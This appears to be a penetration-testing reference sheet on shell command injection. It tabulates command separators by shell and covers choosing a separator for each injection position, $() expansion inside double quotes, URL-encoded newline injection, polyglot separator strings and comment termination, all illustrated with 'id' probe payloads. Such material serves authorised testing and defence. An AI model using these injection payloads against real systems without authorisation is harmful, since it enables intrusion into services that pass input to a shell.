# Separators & Operators — the grammar of shell injection

## The full separator table (POSIX shells)

| Sep | Meaning | Notes |
|---|---|---|
| `;` | run next command unconditionally | most reliable; survives most contexts |
| `\n` (literal newline, `%0a`) | command separator | often missed by single-line filters |
| `&` | background + continue | async — output may not be captured |
| `&&` | run next only on success | baseline command must exit 0 |
| `\|\|` | run next only on failure | invert — baseline must fail |
| `\|` | pipe stdout→stdin | next cmd gets upstream output on stdin |
| `` `cmd` `` | command substitution (stdout inline) | output lands inside the command |
| `$(cmd)` | same, nestable | preferred — nests cleanly |
| `<(cmd)` | process substitution → fd path | bash/zsh only |
| `>(cmd)` | write-side process substitution | bash/zsh only |

## Per-shell availability

| Sep | sh/dash | bash | zsh | fish | cmd.exe | PowerShell |
|---|---|---|---|---|---|---|
| `;` | ✓ | ✓ | ✓ | ✓ | ✗* | ✓ |
| `&` | ✓ | ✓ | ✓ | ✓ (bg) | ✓ (separator) | ✗ (`;` instead) |
| `&&` / `\|\|` | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ (pwsh 7+) |
| `\|` | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| `$( )` | ✓ | ✓ | ✓ | `(...)` fish | ✗ | `$( )` |
| `` ` ` `` | ✓ | ✓ | ✓ | ✗ | ✗ | `` ` `` is escape char! |
| newline | ✓ | ✓ | ✓ | ✓ | ✗ | ✓ |

\* cmd.exe `;` is only a separator in some contexts; use `&`/`&&`/`|`.

## Choosing the right separator for the injection point

| Position | Best separator | Why |
|---|---|---|
| end of command | `;` or `\n` | unconditional, no deps |
| inside argument list | `;` | splits the arg list cleanly |
| inside single-quoted string | `';...'` first — `quoting.md` | must close the quote first |
| inside double-quoted string | `";..."` or `$(cmd)`/`` `cmd` `` — substitution still works inside `"..."` | $() and `` ` `` expand inside double quotes! |
| inside backticks already | `$(cmd)` nests or close+reopen | |
| inside `$( )` | nest `$( )` or close it | |
| after `|` expecting a program name | drop separator, inject whole command | `| id` works — the pipe feeds id's output |

## The most-overlooked detail — `$( )` expands inside double quotes

```sh
ping "127.0.0.1$(id)"   # id RUNS even inside the quotes
ping "127.0.0.1`id`"    # same with backticks
```

If the template is `ping "$INPUT"`, `;` is literal data but `$(id)` still
executes — **command substitution inside double quotes is the highest-yield
probe when separators are quoted**.

## `&&` vs `||` — which side does the payload go on?

- `x && payload` — runs only if left side succeeded (exit 0)
- `x || payload` — runs only if left side failed

For `ping $INPUT`: `127.0.0.1 && id` — ping succeeds → id runs.
`x || id` — ping fails on bad host → id runs — useful when the baseline
deliberately fails.

## Chaining with pipes — stdin games

`x | id` — id's stdin is ping output (ignored) but id's stdout goes to
the pipe's downstream. `x | id | tee out` — chain further. Pipes don't
need the left command to succeed.

## Newline injection — `%0a` / `%0d%0a`

URL-encoded newline is a separator filters often miss:

```
host=127.0.0.1%0aid
host=127.0.0.1%0a/bin/sh -c 'id'
```

Filters that strip `;&|` in one line regex miss `\n`; filters on decoded
input may still miss if they check pre-decode.

## The `|`-as-first-char trick — `/bin/sh -c "|id"`

`|id` pipes the (empty/failing) left side into `id` — works when the
template is `cmd $INPUT` and you inject `| id`.

## Polyglot separator combos — try when one fails

```
;&|;|%0a|&&|
|id;id|&id
;id;#          — `;` to split, `#` to comment the tail
;id||         — absorbs a failing left side
||id          — runs only if left fails — good against a guaranteed-fail baseline
```

## The comment terminator — `#`

Trailing template text breaks syntax: `ping $INPUT -c 4` with
`INPUT=127.0.0.1;id` → `ping 127.0.0.1;id -c 4` — id gets `-c 4` args and
errors. Add `#` to comment the tail: `127.0.0.1;id;#` → `id` runs clean,
`-c 4` is comment. URL-encode the `#` as `%23` in a query string.

## Falsifiers

- all separators echoed as literal data (argv boundary)
- `$(id)` inside double quotes does not expand — no substitution context

## Output to record

- which separator(s) produced new output + the shell identified from the
  error (`sh:`/`bash:`/`dash:`/`cmd.exe` style)
